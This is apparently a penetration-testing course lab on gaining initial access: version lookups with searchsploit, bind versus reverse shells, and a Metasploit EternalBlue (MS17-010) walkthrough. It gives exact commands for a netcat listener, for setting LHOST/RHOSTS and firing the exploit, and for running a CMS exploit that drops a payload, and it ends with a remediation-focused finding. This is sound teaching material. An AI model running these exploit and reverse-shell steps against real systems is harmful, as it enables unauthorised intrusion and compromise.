Lab 08: Service Exploitation & Initial Access

Last week you built the map and found an old service listening. This week you turn that version number into a shell. You'll look up a known flaw, fire the exploit, and land on the box as a user. Metasploit makes it one command, but you'll also read a raw exploit by hand so you understand that there's no magic, just someone else's HTTP requests and packets.

0. Where We Are

🧭
The map pays off

Recon → Map → Identify → Exploit → Document. Last week's scan gave you services and versions. Now you do the step everyone pictures when they think "hacking": find the flaw in one of those services and use it to get a foothold. The quiet truth is that the hard part was the enumeration. Once you know exactly what's running, the exploit is often a two-minute lookup.

1. A Version Number Is a Lookup Key · foundation

🚢
2017: one SMB flaw stops the world's biggest shipping line

Microsoft patched a flaw in the old SMBv1 file-sharing service (MS17-010) in March 2017. The exploit for it, EternalBlue, gave full remote code execution on any unpatched Windows box with port 445 open, no login needed. Two months later WannaCry weaponized it and tore through unpatched machines worldwide. A few weeks after that, NotPetya used the same exploit and hit the shipping giant Maersk so hard they reinstalled 4,000 servers and 45,000 PCs from scratch in ten days. Around $300 million, from one unpatched service.

The patch had been out for two months. Today you run the exact same exploit, EternalBlue, against a box in a lab, and watch a version number become a shell.

When your scan says Apache 2.4.49 or vsftpd 2.3.4, that string is a key you look up. Someone has probably already found the bug, written the exploit, and published it. Your job is to find the right one and point it at the target.

Where you look it up
On your machine (offline) searchsploit <service> <version>
Read the raw exploit searchsploit -x <path>
Online exploit-db.com, the CVE number, the vendor advisory
Pre-packaged Metasploit modules (search inside msfconsole)
🤔 Your scan shows an FTP service running vsftpd 2.3.4. Before you touch anything else, what's your very next move? Guess.
Answer

Look it up: searchsploit vsftpd 2.3.4. That exact version is famous, it shipped with a backdoor. You don't memorize which versions are vulnerable, you look up every version you find. The habit is the skill, not the trivia.

2. Bind Shell vs Reverse Shell · foundation

Every exploit ends the same way: you want a shell on the target. There are two directions that connection can go, and one of them almost never works on a real network. Know the difference before you pick a payload.

Bind shell

usually blocked 
target opens a port, waits
you connect IN to target:4444
# a firewall or NAT in front of
# the target drops your inbound
# connection. dead on arrival.

Reverse shell

works through NAT 
you listen: nc -lvnp 4444
exploit tells target to connect
OUT to you:4444
# outbound connections are almost
# always allowed. the target calls
# home, you catch the shell.
📞
Why reverse wins

Firewalls are strict about who connects in and lazy about what connects out. So you make the victim dial you. Same reverse shell you met in Lab 06, now it's the default payload for every exploit. Set your LHOST (your IP) and LPORT, start a listener, fire.

🟢 Baseline · the Metasploit exploit flow

This same five-step rhythm runs every Metasploit exploit. Learn it once:

msfconsole · pick, aim, fire
msfconsole                                      # open the console
search ms17-010                                 # find the module
use exploit/windows/smb/ms17_010_eternalblue    # select it
show options                                     # what does it need?
set RHOSTS <TARGET_IP>                           # the victim
set LHOST <YOUR_VPN_IP>                          # you (for the reverse shell)
exploit                                          # fire
# → meterpreter session opens. you're SYSTEM.
🤔 You set RHOSTS to the target and run exploit, but nothing connects back. You forgot one setting. Which one, and why does it break everything? Guess.
Answer

LHOST, your IP. It's a reverse shell (§2): the target connects back to you. If LHOST is wrong or unset, the exploit runs but the shell dials the wrong number and you catch nothing. On a VPN'd lab, set it to your tun0 address, not your home IP.

🟡 Stretch · the searchsploit workflow

  1. Take the service and version from your scan, and search your local exploit database: 
    searchsploit icecast          # list known exploits for the service
searchsploit -x <path>         # read the exploit's source before you run it
  2. Read the top of the exploit. It tells you what it does, what to set, and often the CVE. Never run an exploit you haven't read.
  3. Run it with the target details. A reverse-shell exploit still needs your listener (nc -lvnp) up first.

🔴 Going Pro · read the exploit, then land it

  1. Identify the CMS and its exact version from the site (footer, headers, login page).
  2. searchsploit <cms> <version>, then searchsploit -x to open the raw exploit. Read it top to bottom.
  3. Notice it's just a sequence of HTTP requests: log in, hit the vulnerable endpoint, drop a payload. The "exploit" is a script doing what you could do by hand in Burp.
  4. Set the target URL, creds, and your listener details inside the script, then run it and catch the shell.

The moment the "magic" disappears is the moment you become dangerous. An exploit is someone's notes on a bug, written as code. You can read, fix, and write them too.

Payload names decoded: staged vs stageless

Metasploit payloads look like punctuation soup until you see the one rule. A slash means staged: windows/meterpreter/reverse_tcp sends a tiny stub first, which then pulls down the full payload. Smaller, needs a stable connection.

An underscore means stageless: windows/meterpreter_reverse_tcp ships the whole payload in one shot. Bigger, but more reliable over a flaky link. Same tool, two delivery methods.

6. Write the Finding · document

Initial access from a known vulnerability is one of the most common real findings, and one of the most preventable. Write it so the fix is obvious: patch.

📓 FINDING · Remote code execution via an unpatched service severity: Critical
TitleUnauthenticated remote code execution in an outdated, unpatched service
SeverityCritical · CVSS 9.8 (remote, no auth, full system compromise)
Affected serviceThe vulnerable service and version from your scan (e.g. SMBv1 on 445 for MS17-010), with its CVE
Steps to reproduce1. nmap -sV identifies the service version. 2. searchsploit / the CVE maps it to a public exploit. 3. Running the exploit returns a shell as the service account. Evidence: the whoami output from the session.
ImpactFull control of the host with no credentials. One unpatched box becomes the attacker's foothold into the whole network, exactly how WannaCry and NotPetya spread.
RemediationPatch to a supported version and apply the vendor fix (MS17-010 and its kind). Disable legacy protocols like SMBv1. Segment the network so one foothold can't reach everything. Track service versions so you know what's exposed.

The shell you just caught usually isn't root yet. You're in as the service account. Turning that into full control of the box is Lab 09.
